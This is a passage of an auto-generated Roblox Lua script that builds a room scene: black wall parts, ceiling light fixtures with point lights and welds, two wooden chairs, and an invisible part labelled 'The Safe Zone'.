			Part12.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
			Part12.Size = Vector3.new(31, 297, 1)
			Part12.Anchored = true
			Part12.BottomSurface = Enum.SurfaceType.Smooth
			Part12.BrickColor = BrickColor.new("Really black")
			Part12.TopSurface = Enum.SurfaceType.Smooth
			Part12.brickColor = BrickColor.new("Really black")
			Part13.Name = "BlackPart"
			Part13.Parent = Model0
			Part13.CFrame = CFrame.new(558.5, 4859.99951, -127.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part13.Position = Vector3.new(558.5, 4859.99951171875, -127.5)
			Part13.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
			Part13.Size = Vector3.new(1, 302, 119)
			Part13.Anchored = true
			Part13.BottomSurface = Enum.SurfaceType.Smooth
			Part13.BrickColor = BrickColor.new("Really black")
			Part13.TopSurface = Enum.SurfaceType.Smooth
			Part13.brickColor = BrickColor.new("Really black")
			Part14.Name = "BlackPart"
			Part14.Parent = Model0
			Part14.CFrame = CFrame.new(558.5, 4859.99951, -44, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part14.Position = Vector3.new(558.5, 4859.99951171875, -44)
			Part14.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
			Part14.Size = Vector3.new(1, 302, 54)
			Part14.Anchored = true
			Part14.BottomSurface = Enum.SurfaceType.Smooth
			Part14.BrickColor = BrickColor.new("Really black")
			Part14.TopSurface = Enum.SurfaceType.Smooth
			Part14.brickColor = BrickColor.new("Really black")
			Part15.Name = "BlackPart"
			Part15.Parent = Model0
			Part15.CFrame = CFrame.new(404.5, 4859.99951, -17.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part15.Position = Vector3.new(404.5, 4859.99951171875, -17.5)
			Part15.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
			Part15.Size = Vector3.new(309, 302, 1)
			Part15.Anchored = true
			Part15.BottomSurface = Enum.SurfaceType.Smooth
			Part15.BrickColor = BrickColor.new("Really black")
			Part15.TopSurface = Enum.SurfaceType.Smooth
			Part15.brickColor = BrickColor.new("Really black")
			Model16.Parent = Model0
			Model17.Name = "Light"
			Model17.Parent = Model16
			Part18.Name = "Light"
			Part18.Parent = Model17
			Part18.CFrame = CFrame.new(479, 4894.1001, -137.478271, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part18.Position = Vector3.new(479, 4894.10009765625, -137.478271484375)
			Part18.Color = Color3.new(0.992157, 0.917647, 0.552941)
			Part18.Size = Vector3.new(2, 0.20000000298023224, 2)
			Part18.Anchored = true
			Part18.BottomSurface = Enum.SurfaceType.Smooth
			Part18.BrickColor = BrickColor.new("Cool yellow")
			Part18.Material = Enum.Material.SmoothPlastic
			Part18.Reflectance = 0.4000000059604645
			Part18.TopSurface = Enum.SurfaceType.Smooth
			Part18.brickColor = BrickColor.new("Cool yellow")
			Part18.FormFactor = Enum.FormFactor.Custom
			Part18.formFactor = Enum.FormFactor.Custom
			CylinderMesh19.Parent = Part18
			CylinderMesh19.Scale = Vector3.new(1, 1.0099999904632568, 1)
			PointLight20.Parent = Part18
			PointLight20.Range = 40
			Weld21.Parent = Part18
			Weld21.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld21.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld21.Part1 = Part18
			Weld21.part1 = Part18
			Part22.Parent = Model17
			Part22.CFrame = CFrame.new(479, 4894.1001, -137.478271, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part22.Position = Vector3.new(479, 4894.10009765625, -137.478271484375)
			Part22.Color = Color3.new(0.388235, 0.372549, 0.384314)
			Part22.Size = Vector3.new(2.4000000953674316, 0.20000000298023224, 2.4000000953674316)
			Part22.Anchored = true
			Part22.BottomSurface = Enum.SurfaceType.Smooth
			Part22.BrickColor = BrickColor.new("Dark stone grey")
			Part22.Material = Enum.Material.SmoothPlastic
			Part22.TopSurface = Enum.SurfaceType.Smooth
			Part22.brickColor = BrickColor.new("Dark stone grey")
			Part22.FormFactor = Enum.FormFactor.Custom
			Part22.formFactor = Enum.FormFactor.Custom
			CylinderMesh23.Parent = Part22
			Weld24.Parent = Part22
			Weld24.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld24.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld24.Part1 = Part22
			Weld24.part1 = Part22
			Part25.Parent = Model16
			Part25.CFrame = CFrame.new(496, 4927.5, -168.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part25.Position = Vector3.new(496, 4927.5, -168.5)
			Part25.Transparency = 1
			Part25.Size = Vector3.new(28, 1, 1)
			Part25.BottomSurface = Enum.SurfaceType.Smooth
			Part25.TopSurface = Enum.SurfaceType.Smooth
			PointLight26.Parent = Part25
			PointLight26.Color = Color3.new(0.654902, 0.898039, 1)
			PointLight26.Range = 40
			Part27.Parent = Model16
			Part27.CFrame = CFrame.new(496, 4927.5, -65.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part27.Position = Vector3.new(496, 4927.5, -65.5)
			Part27.Transparency = 1
			Part27.Size = Vector3.new(28, 1, 1)
			Part27.BottomSurface = Enum.SurfaceType.Smooth
			Part27.TopSurface = Enum.SurfaceType.Smooth
			PointLight28.Parent = Part27
			PointLight28.Range = 40
			Part29.Parent = Model16
			Part29.CFrame = CFrame.new(472, 4890.49951, -168.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part29.Position = Vector3.new(472, 4890.49951171875, -168.5)
			Part29.Transparency = 1
			Part29.Size = Vector3.new(28, 1, 1)
			Part29.BottomSurface = Enum.SurfaceType.Smooth
			Part29.TopSurface = Enum.SurfaceType.Smooth
			PointLight30.Parent = Part29
			PointLight30.Color = Color3.new(0.0392157, 1, 0.968628)
			PointLight30.Range = 40
			Part31.Parent = Model16
			Part31.CFrame = CFrame.new(530, 4890.49951, -168.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part31.Position = Vector3.new(530, 4890.49951171875, -168.5)
			Part31.Transparency = 1
			Part31.Size = Vector3.new(28, 1, 1)
			Part31.BottomSurface = Enum.SurfaceType.Smooth
			Part31.TopSurface = Enum.SurfaceType.Smooth
			PointLight32.Parent = Part31
			PointLight32.Color = Color3.new(1, 0, 0.0156863)
			PointLight32.Range = 40
			Model33.Parent = Model0
			Model34.Name = "Light"
			Model34.Parent = Model33
			Part35.Name = "Light"
			Part35.Parent = Model34
			Part35.CFrame = CFrame.new(516, 4894, -94.521759, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part35.Position = Vector3.new(516, 4894, -94.52175903320312)
			Part35.Color = Color3.new(0.992157, 0.917647, 0.552941)
			Part35.Size = Vector3.new(2, 0.20000000298023224, 2)
			Part35.Anchored = true
			Part35.BottomSurface = Enum.SurfaceType.Smooth
			Part35.BrickColor = BrickColor.new("Cool yellow")
			Part35.Material = Enum.Material.SmoothPlastic
			Part35.Reflectance = 0.4000000059604645
			Part35.TopSurface = Enum.SurfaceType.Smooth
			Part35.brickColor = BrickColor.new("Cool yellow")
			Part35.FormFactor = Enum.FormFactor.Custom
			Part35.formFactor = Enum.FormFactor.Custom
			CylinderMesh36.Parent = Part35
			CylinderMesh36.Scale = Vector3.new(1, 1.0099999904632568, 1)
			PointLight37.Parent = Part35
			PointLight37.Range = 40
			Weld38.Parent = Part35
			Weld38.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld38.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld38.Part1 = Part35
			Weld38.part1 = Part35
			Part39.Parent = Model34
			Part39.CFrame = CFrame.new(516, 4894, -94.521759, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part39.Position = Vector3.new(516, 4894, -94.52175903320312)
			Part39.Color = Color3.new(0.388235, 0.372549, 0.384314)
			Part39.Size = Vector3.new(2.4000000953674316, 0.20000000298023224, 2.4000000953674316)
			Part39.Anchored = true
			Part39.BottomSurface = Enum.SurfaceType.Smooth
			Part39.BrickColor = BrickColor.new("Dark stone grey")
			Part39.Material = Enum.Material.SmoothPlastic
			Part39.TopSurface = Enum.SurfaceType.Smooth
			Part39.brickColor = BrickColor.new("Dark stone grey")
			Part39.FormFactor = Enum.FormFactor.Custom
			Part39.formFactor = Enum.FormFactor.Custom
			CylinderMesh40.Parent = Part39
			Weld41.Parent = Part39
			Weld41.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld41.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld41.Part1 = Part39
			Weld41.part1 = Part39
			Model42.Parent = Model0
			Model43.Name = "Light"
			Model43.Parent = Model42
			Part44.Name = "Light"
			Part44.Parent = Model43
			Part44.CFrame = CFrame.new(526, 4894.1001, -147.478271, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part44.Position = Vector3.new(526, 4894.10009765625, -147.478271484375)
			Part44.Color = Color3.new(0.992157, 0.917647, 0.552941)
			Part44.Size = Vector3.new(2, 0.20000000298023224, 2)
			Part44.Anchored = true
			Part44.BottomSurface = Enum.SurfaceType.Smooth
			Part44.BrickColor = BrickColor.new("Cool yellow")
			Part44.Material = Enum.Material.SmoothPlastic
			Part44.Reflectance = 0.4000000059604645
			Part44.TopSurface = Enum.SurfaceType.Smooth
			Part44.brickColor = BrickColor.new("Cool yellow")
			Part44.FormFactor = Enum.FormFactor.Custom
			Part44.formFactor = Enum.FormFactor.Custom
			CylinderMesh45.Parent = Part44
			CylinderMesh45.Scale = Vector3.new(1, 1.0099999904632568, 1)
			PointLight46.Parent = Part44
			PointLight46.Range = 40
			Weld47.Parent = Part44
			Weld47.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld47.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld47.Part1 = Part44
			Weld47.part1 = Part44
			Part48.Parent = Model43
			Part48.CFrame = CFrame.new(526, 4894.1001, -147.478271, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part48.Position = Vector3.new(526, 4894.10009765625, -147.478271484375)
			Part48.Color = Color3.new(0.388235, 0.372549, 0.384314)
			Part48.Size = Vector3.new(2.4000000953674316, 0.20000000298023224, 2.4000000953674316)
			Part48.Anchored = true
			Part48.BottomSurface = Enum.SurfaceType.Smooth
			Part48.BrickColor = BrickColor.new("Dark stone grey")
			Part48.Material = Enum.Material.SmoothPlastic
			Part48.TopSurface = Enum.SurfaceType.Smooth
			Part48.brickColor = BrickColor.new("Dark stone grey")
			Part48.FormFactor = Enum.FormFactor.Custom
			Part48.formFactor = Enum.FormFactor.Custom
			CylinderMesh49.Parent = Part48
			Weld50.Parent = Part48
			Weld50.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld50.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld50.Part1 = Part48
			Weld50.part1 = Part48
			Model51.Name = "Chair"
			Model51.Parent = Model0
			Part52.Parent = Model51
			Part52.CFrame = CFrame.new(456.100006, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part52.Orientation = Vector3.new(0, -90, 0)
			Part52.Position = Vector3.new(456.1000061035156, 4896.10009765625, -70.4217529296875)
			Part52.Rotation = Vector3.new(0, -90, 0)
			Part52.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part52.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part52.Anchored = true
			Part52.BrickColor = BrickColor.new("Brown")
			Part52.Material = Enum.Material.Wood
			Part52.brickColor = BrickColor.new("Brown")
			Part53.Parent = Model51
			Part53.CFrame = CFrame.new(454.100006, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part53.Orientation = Vector3.new(0, -90, 0)
			Part53.Position = Vector3.new(454.1000061035156, 4896.10009765625, -70.4217529296875)
			Part53.Rotation = Vector3.new(0, -90, 0)
			Part53.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part53.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part53.Anchored = true
			Part53.BrickColor = BrickColor.new("Brown")
			Part53.Material = Enum.Material.Wood
			Part53.brickColor = BrickColor.new("Brown")
			Part54.Parent = Model51
			Part54.CFrame = CFrame.new(455.100006, 4898.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part54.Orientation = Vector3.new(0, -90, 0)
			Part54.Position = Vector3.new(455.1000061035156, 4898.10009765625, -70.4217529296875)
			Part54.Rotation = Vector3.new(0, -90, 0)
			Part54.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part54.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part54.Anchored = true
			Part54.BrickColor = BrickColor.new("Brown")
			Part54.Material = Enum.Material.Wood
			Part54.brickColor = BrickColor.new("Brown")
			Part55.Parent = Model51
			Part55.CFrame = CFrame.new(455.100006, 4897.30029, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part55.Orientation = Vector3.new(0, -90, 0)
			Part55.Position = Vector3.new(455.1000061035156, 4897.30029296875, -70.4217529296875)
			Part55.Rotation = Vector3.new(0, -90, 0)
			Part55.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part55.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part55.Anchored = true
			Part55.BrickColor = BrickColor.new("Brown")
			Part55.Material = Enum.Material.Wood
			Part55.brickColor = BrickColor.new("Brown")
			Part56.Parent = Model51
			Part56.CFrame = CFrame.new(455.100006, 4897.7002, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part56.Orientation = Vector3.new(0, -90, 0)
			Part56.Position = Vector3.new(455.1000061035156, 4897.7001953125, -70.4217529296875)
			Part56.Rotation = Vector3.new(0, -90, 0)
			Part56.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part56.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part56.Anchored = true
			Part56.BrickColor = BrickColor.new("Brown")
			Part56.Material = Enum.Material.Wood
			Part56.brickColor = BrickColor.new("Brown")
			Seat57.Parent = Model51
			Seat57.CFrame = CFrame.new(455.100006, 4895.7002, -71.0217514, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Seat57.Position = Vector3.new(455.1000061035156, 4895.7001953125, -71.0217514038086)
			Seat57.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Seat57.Transparency = 1
			Seat57.Size = Vector3.new(1.7999999523162842, 0.20000000298023224, 1)
			Seat57.Anchored = true
			Seat57.BrickColor = BrickColor.new("Brown")
			Seat57.Material = Enum.Material.Wood
			Seat57.TopSurface = Enum.SurfaceType.SmoothNoOutlines
			Seat57.brickColor = BrickColor.new("Brown")
			Part58.Parent = Model51
			Part58.CFrame = CFrame.new(455.100006, 4896.8999, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part58.Orientation = Vector3.new(0, -90, 0)
			Part58.Position = Vector3.new(455.1000061035156, 4896.89990234375, -70.4217529296875)
			Part58.Rotation = Vector3.new(0, -90, 0)
			Part58.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part58.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part58.Anchored = true
			Part58.BrickColor = BrickColor.new("Brown")
			Part58.Material = Enum.Material.Wood
			Part58.brickColor = BrickColor.new("Brown")
			Part59.Parent = Model51
			Part59.CFrame = CFrame.new(456.100006, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part59.Orientation = Vector3.new(0, -90, 0)
			Part59.Position = Vector3.new(456.1000061035156, 4894.89990234375, -72.4217529296875)
			Part59.Rotation = Vector3.new(0, -90, 0)
			Part59.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part59.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part59.Anchored = true
			Part59.BrickColor = BrickColor.new("Brown")
			Part59.Material = Enum.Material.Wood
			Part59.brickColor = BrickColor.new("Brown")
			Part60.Parent = Model51
			Part60.CFrame = CFrame.new(454.100006, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part60.Orientation = Vector3.new(0, -90, 0)
			Part60.Position = Vector3.new(454.1000061035156, 4894.89990234375, -72.4217529296875)
			Part60.Rotation = Vector3.new(0, -90, 0)
			Part60.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part60.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part60.Anchored = true
			Part60.BrickColor = BrickColor.new("Brown")
			Part60.Material = Enum.Material.Wood
			Part60.brickColor = BrickColor.new("Brown")
			UnionOperation61.Parent = Model51
			UnionOperation61.CFrame = CFrame.new(455.100006, 4895.7002, -71.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			UnionOperation61.Orientation = Vector3.new(0, -90, 0)
			UnionOperation61.Position = Vector3.new(455.1000061035156, 4895.7001953125, -71.4217529296875)
			UnionOperation61.Rotation = Vector3.new(0, -90, 0)
			UnionOperation61.Color = Color3.new(0.486275, 0.360784, 0.27451)
			UnionOperation61.Size = Vector3.new(2.1999995708465576, 0.20000043511390686, 2.1999988555908203)
			UnionOperation61.Anchored = true
			UnionOperation61.BrickColor = BrickColor.new("Brown")
			UnionOperation61.Material = Enum.Material.Wood
			UnionOperation61.brickColor = BrickColor.new("Brown")
			UnionOperation61.UsePartColor = true
			Model62.Parent = Model0
			Model63.Name = "Light"
			Model63.Parent = Model62
			Part64.Name = "Light"
			Part64.Parent = Model63
			Part64.CFrame = CFrame.new(476, 4894, -98.521759, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part64.Position = Vector3.new(476, 4894, -98.52175903320312)
			Part64.Color = Color3.new(0.992157, 0.917647, 0.552941)
			Part64.Size = Vector3.new(2, 0.20000000298023224, 2)
			Part64.Anchored = true
			Part64.BottomSurface = Enum.SurfaceType.Smooth
			Part64.BrickColor = BrickColor.new("Cool yellow")
			Part64.Material = Enum.Material.SmoothPlastic
			Part64.Reflectance = 0.4000000059604645
			Part64.TopSurface = Enum.SurfaceType.Smooth
			Part64.brickColor = BrickColor.new("Cool yellow")
			Part64.FormFactor = Enum.FormFactor.Custom
			Part64.formFactor = Enum.FormFactor.Custom
			CylinderMesh65.Parent = Part64
			CylinderMesh65.Scale = Vector3.new(1, 1.0099999904632568, 1)
			PointLight66.Parent = Part64
			PointLight66.Range = 40
			Weld67.Parent = Part64
			Weld67.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld67.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld67.Part1 = Part64
			Weld67.part1 = Part64
			Part68.Parent = Model63
			Part68.CFrame = CFrame.new(476, 4894, -98.521759, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part68.Position = Vector3.new(476, 4894, -98.52175903320312)
			Part68.Color = Color3.new(0.388235, 0.372549, 0.384314)
			Part68.Size = Vector3.new(2.4000000953674316, 0.20000000298023224, 2.4000000953674316)
			Part68.Anchored = true
			Part68.BottomSurface = Enum.SurfaceType.Smooth
			Part68.BrickColor = BrickColor.new("Dark stone grey")
			Part68.Material = Enum.Material.SmoothPlastic
			Part68.TopSurface = Enum.SurfaceType.Smooth
			Part68.brickColor = BrickColor.new("Dark stone grey")
			Part68.FormFactor = Enum.FormFactor.Custom
			Part68.formFactor = Enum.FormFactor.Custom
			CylinderMesh69.Parent = Part68
			Weld70.Parent = Part68
			Weld70.C0 = CFrame.new(-37.625, 0.5, 23.75, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			Weld70.C1 = CFrame.new(-33.2329559, -0.100008011, 18.0005493, -0.999996424, 0, 0, 0, 0, 0.999996662, 0, 0.999999762, 0)
			Weld70.Part1 = Part68
			Weld70.part1 = Part68
			Model71.Name = "Chair"
			Model71.Parent = Model0
			Part72.Parent = Model71
			Part72.CFrame = CFrame.new(466.100006, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part72.Orientation = Vector3.new(0, -90, 0)
			Part72.Position = Vector3.new(466.1000061035156, 4896.10009765625, -70.4217529296875)
			Part72.Rotation = Vector3.new(0, -90, 0)
			Part72.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part72.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part72.Anchored = true
			Part72.BrickColor = BrickColor.new("Brown")
			Part72.Material = Enum.Material.Wood
			Part72.brickColor = BrickColor.new("Brown")
			Part73.Parent = Model71
			Part73.CFrame = CFrame.new(464.100006, 4896.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part73.Orientation = Vector3.new(0, -90, 0)
			Part73.Position = Vector3.new(464.1000061035156, 4896.10009765625, -70.4217529296875)
			Part73.Rotation = Vector3.new(0, -90, 0)
			Part73.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part73.Size = Vector3.new(0.20000000298023224, 4.200000286102295, 0.20000000298023224)
			Part73.Anchored = true
			Part73.BrickColor = BrickColor.new("Brown")
			Part73.Material = Enum.Material.Wood
			Part73.brickColor = BrickColor.new("Brown")
			Part74.Parent = Model71
			Part74.CFrame = CFrame.new(465.100006, 4898.1001, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part74.Orientation = Vector3.new(0, -90, 0)
			Part74.Position = Vector3.new(465.1000061035156, 4898.10009765625, -70.4217529296875)
			Part74.Rotation = Vector3.new(0, -90, 0)
			Part74.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part74.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part74.Anchored = true
			Part74.BrickColor = BrickColor.new("Brown")
			Part74.Material = Enum.Material.Wood
			Part74.brickColor = BrickColor.new("Brown")
			Part75.Parent = Model71
			Part75.CFrame = CFrame.new(465.100006, 4897.30029, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part75.Orientation = Vector3.new(0, -90, 0)
			Part75.Position = Vector3.new(465.1000061035156, 4897.30029296875, -70.4217529296875)
			Part75.Rotation = Vector3.new(0, -90, 0)
			Part75.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part75.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part75.Anchored = true
			Part75.BrickColor = BrickColor.new("Brown")
			Part75.Material = Enum.Material.Wood
			Part75.brickColor = BrickColor.new("Brown")
			Part76.Parent = Model71
			Part76.CFrame = CFrame.new(465.100006, 4897.7002, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part76.Orientation = Vector3.new(0, -90, 0)
			Part76.Position = Vector3.new(465.1000061035156, 4897.7001953125, -70.4217529296875)
			Part76.Rotation = Vector3.new(0, -90, 0)
			Part76.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part76.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part76.Anchored = true
			Part76.BrickColor = BrickColor.new("Brown")
			Part76.Material = Enum.Material.Wood
			Part76.brickColor = BrickColor.new("Brown")
			Seat77.Parent = Model71
			Seat77.CFrame = CFrame.new(465.100006, 4895.7002, -71.0217514, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Seat77.Position = Vector3.new(465.1000061035156, 4895.7001953125, -71.0217514038086)
			Seat77.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Seat77.Transparency = 1
			Seat77.Size = Vector3.new(1.7999999523162842, 0.20000000298023224, 1)
			Seat77.Anchored = true
			Seat77.BrickColor = BrickColor.new("Brown")
			Seat77.Material = Enum.Material.Wood
			Seat77.TopSurface = Enum.SurfaceType.SmoothNoOutlines
			Seat77.brickColor = BrickColor.new("Brown")
			Part78.Parent = Model71
			Part78.CFrame = CFrame.new(465.100006, 4896.8999, -70.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part78.Orientation = Vector3.new(0, -90, 0)
			Part78.Position = Vector3.new(465.1000061035156, 4896.89990234375, -70.4217529296875)
			Part78.Rotation = Vector3.new(0, -90, 0)
			Part78.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part78.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 1.8000000715255737)
			Part78.Anchored = true
			Part78.BrickColor = BrickColor.new("Brown")
			Part78.Material = Enum.Material.Wood
			Part78.brickColor = BrickColor.new("Brown")
			Part79.Parent = Model71
			Part79.CFrame = CFrame.new(466.100006, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part79.Orientation = Vector3.new(0, -90, 0)
			Part79.Position = Vector3.new(466.1000061035156, 4894.89990234375, -72.4217529296875)
			Part79.Rotation = Vector3.new(0, -90, 0)
			Part79.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part79.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part79.Anchored = true
			Part79.BrickColor = BrickColor.new("Brown")
			Part79.Material = Enum.Material.Wood
			Part79.brickColor = BrickColor.new("Brown")
			Part80.Parent = Model71
			Part80.CFrame = CFrame.new(464.100006, 4894.8999, -72.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			Part80.Orientation = Vector3.new(0, -90, 0)
			Part80.Position = Vector3.new(464.1000061035156, 4894.89990234375, -72.4217529296875)
			Part80.Rotation = Vector3.new(0, -90, 0)
			Part80.Color = Color3.new(0.486275, 0.360784, 0.27451)
			Part80.Size = Vector3.new(0.20000000298023224, 1.8000004291534424, 0.20000000298023224)
			Part80.Anchored = true
			Part80.BrickColor = BrickColor.new("Brown")
			Part80.Material = Enum.Material.Wood
			Part80.brickColor = BrickColor.new("Brown")
			UnionOperation81.Parent = Model71
			UnionOperation81.CFrame = CFrame.new(465.100006, 4895.7002, -71.4217529, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			UnionOperation81.Orientation = Vector3.new(0, -90, 0)
			UnionOperation81.Position = Vector3.new(465.1000061035156, 4895.7001953125, -71.4217529296875)
			UnionOperation81.Rotation = Vector3.new(0, -90, 0)
			UnionOperation81.Color = Color3.new(0.486275, 0.360784, 0.27451)
			UnionOperation81.Size = Vector3.new(2.1999995708465576, 0.20000043511390686, 2.1999988555908203)
			UnionOperation81.Anchored = true
			UnionOperation81.BrickColor = BrickColor.new("Brown")
			UnionOperation81.Material = Enum.Material.Wood
			UnionOperation81.brickColor = BrickColor.new("Brown")
			UnionOperation81.UsePartColor = true
			Part82.Name = "TheSafeZone"
			Part82.Parent = Model0
			Part82.CFrame = CFrame.new(495.399994, 4930.56934, -176.399994, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			Part82.Orientation = Vector3.new(0, 180, 0)
			Part82.Position = Vector3.new(495.3999938964844, 4930.5693359375, -176.39999389648438)
			Part82.Rotation = Vector3.new(180, 0, 180)
			Part82.Transparency = 1
			Part82.Size = Vector3.new(42.79998779296875, 41.1400032043457, 19.200000762939453)
			Part82.Anchored = true
			Part82.BottomSurface = Enum.SurfaceType.Smooth
			Part82.CanCollide = false
			Part82.TopSurface = Enum.SurfaceType.Smooth
			Part82.FormFactor = Enum.FormFactor.Custom
			Part82.formFactor = Enum.FormFactor.Custom
			SurfaceGui83.Parent = Part82
			TextLabel84.Parent = SurfaceGui83
			TextLabel84.Size = UDim2.new(1, 0, 1, 0)
			TextLabel84.BackgroundColor = BrickColor.new("Camo")
			TextLabel84.BackgroundColor3 = Color3.new(0.333333, 0.666667, 0)
			TextLabel84.BackgroundTransparency = 1
			TextLabel84.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			TextLabel84.ClipsDescendants = true
			TextLabel84.Font = Enum.Font.ArialBold
			TextLabel84.FontSize = Enum.FontSize.Size14
			TextLabel84.Text = ""
			TextLabel84.TextColor = BrickColor.new("Tr. Blue")
			TextLabel84.TextColor3 = Color3.new(0.509804, 0.796079, 1)
			TextLabel84.TextSize = 14
			TextLabel84.TextWrap = true
			TextLabel84.TextWrapped = true
			TextLabel85.Parent = TextLabel84
			TextLabel85.Position = UDim2.new(0, 0, 0.400000006, 0)
			TextLabel85.Size = UDim2.new(1, 0, 0.200000003, 0)
			TextLabel85.BackgroundColor = BrickColor.new("Institutional white")
			TextLabel85.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel85.BackgroundTransparency = 1
			TextLabel85.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			TextLabel85.Font = Enum.Font.Unknown
			TextLabel85.FontSize = Enum.FontSize.Size48
			TextLabel85.Text = "The Safe Zone"
			TextLabel85.TextColor = BrickColor.new("Tr. Blue")
			TextLabel85.TextColor3 = Color3.new(0.509804, 0.796079, 1)
			TextLabel85.TextScaled = true
			TextLabel85.TextSize = 48
			TextLabel85.TextWrap = true
